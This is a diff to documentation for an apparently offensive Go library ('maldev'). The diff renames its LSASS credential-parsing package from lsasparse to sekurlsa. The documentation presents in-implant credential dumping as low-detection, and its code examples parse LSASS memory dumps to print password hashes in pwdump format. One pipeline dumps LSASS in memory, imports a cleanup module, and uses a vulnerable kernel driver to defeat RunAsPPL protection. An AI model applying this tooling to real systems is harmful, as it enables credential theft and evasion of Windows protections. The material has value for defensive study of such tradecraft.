@@ -3,7 +3,7 @@
 [<- Back to Credentials](../../credentials.md)
 
 **MITRE ATT&CK:** [T1003.001 — OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
-**Package:** `credentials/lsasparse`
+**Package:** `credentials/sekurlsa`
 **Platform:** Cross-platform (pure Go)
 **Detection:** Low — runs entirely in the implant's own address space, no Win32 calls
 
@@ -19,7 +19,7 @@ host or pypykatz on a Linux analyst box — which means exfil-ing a
 50 MB+ file, leaving it on disk somewhere, and depending on a Python
 runtime + 50 MB of crypto deps for the analyst.
 
-`credentials/lsasparse` is the **consumer** — pure-Go MINIDUMP
+`credentials/sekurlsa` is the **consumer** — pure-Go MINIDUMP
 parsing + in-process credential extraction, so the implant pipeline
 becomes:
 
@@ -41,7 +41,7 @@ extraction layer.
 ```mermaid
 sequenceDiagram
     participant Caller
-    participant Parse as lsasparse.Parse
+    participant Parse as sekurlsa.Parse
     participant Reader as MINIDUMP reader
     participant Crypto as LSA crypto
     participant Walker as MSV1_0 walker
@@ -89,11 +89,11 @@ import (
     "fmt"
     "log"
 
-    "github.com/oioio-space/maldev/credentials/lsasparse"
+    "github.com/oioio-space/maldev/credentials/sekurlsa"
 )
 
 func main() {
-    result, err := lsasparse.ParseFile(`C:\ProgramData\Intel\snapshot.dmp`)
+    result, err := sekurlsa.ParseFile(`C:\ProgramData\Intel\snapshot.dmp`)
     if err != nil {
         log.Fatal(err)
     }
@@ -104,7 +104,7 @@ func main() {
 
     for _, s := range result.Sessions {
         for _, c := range s.Credentials {
-            if msv, ok := c.(lsasparse.MSV1_0Credential); ok && msv.Found {
+            if msv, ok := c.(sekurlsa.MSV1_0Credential); ok && msv.Found {
                 fmt.Println(msv.String()) // pwdump format
             }
         }
@@ -132,14 +132,14 @@ import (
     "errors"
     "log"
 
-    "github.com/oioio-space/maldev/credentials/lsasparse"
+    "github.com/oioio-space/maldev/credentials/sekurlsa"
 )
 
 func init() {
     // Win11 24H2 (build 26100) — patterns derived offline from the
     // Microsoft-shipped lsasrv.dll for this CU. See docs/credentials.md
     // for the workflow.
-    _ = lsasparse.RegisterTemplate(&lsasparse.Template{
+    _ = sekurlsa.RegisterTemplate(&sekurlsa.Template{
         BuildMin:                26100,
         BuildMax:                26100,
         IVPattern:               []byte{ /* operator-derived bytes */ },
@@ -151,7 +151,7 @@ func init() {
         LogonSessionListPattern: []byte{ /* … */ },
         LogonSessionListOffset:  0x17,
         LogonSessionListCount:   64,
-        MSVLayout: lsasparse.MSVLayout{
+        MSVLayout: sekurlsa.MSVLayout{
             NodeSize:          0x110,
             LUIDOffset:        0x10,
             UserNameOffset:    0x90,
@@ -164,11 +164,11 @@ func init() {
 }
 
 func main() {
-    result, err := lsasparse.ParseFile("snapshot.dmp")
+    result, err := sekurlsa.ParseFile("snapshot.dmp")
     switch {
-    case errors.Is(err, lsasparse.ErrUnsupportedBuild):
+    case errors.Is(err, sekurlsa.ErrUnsupportedBuild):
         log.Fatalf("build %d not covered; register a template", result.BuildNumber)
-    case errors.Is(err, lsasparse.ErrLSASRVNotFound):
+    case errors.Is(err, sekurlsa.ErrLSASRVNotFound):
         log.Fatal("dump missing lsasrv.dll module — wrong process?")
     case err != nil:
         log.Fatal(err)
@@ -193,7 +193,7 @@ import (
     "fmt"
     "log"
 
-    "github.com/oioio-space/maldev/credentials/lsasparse"
+    "github.com/oioio-space/maldev/credentials/sekurlsa"
     "github.com/oioio-space/maldev/credentials/lsassdump"
     "github.com/oioio-space/maldev/cleanup/memory"
 )
@@ -213,7 +213,7 @@ func main() {
     }
 
     // 3. Parse the bytes still in memory.
-    result, err := lsasparse.Parse(bytes.NewReader(buf.Bytes()), int64(buf.Len()))
+    result, err := sekurlsa.Parse(bytes.NewReader(buf.Bytes()), int64(buf.Len()))
     if err != nil {
         log.Fatal(err)
     }
@@ -222,7 +222,7 @@ func main() {
     // 4. Use the credentials.
     for _, s := range result.Sessions {
         for _, c := range s.Credentials {
-            if msv, ok := c.(lsasparse.MSV1_0Credential); ok && msv.Found {
+            if msv, ok := c.(sekurlsa.MSV1_0Credential); ok && msv.Found {
                 fmt.Println(msv.String())
             }
         }
@@ -239,7 +239,7 @@ RunAsPPL=1:
 ```go
 import (
     "github.com/oioio-space/maldev/credentials/lsassdump"
-    "github.com/oioio-space/maldev/credentials/lsasparse"
+    "github.com/oioio-space/maldev/credentials/sekurlsa"
     "github.com/oioio-space/maldev/kernel/driver/rtcore64"
 )
 
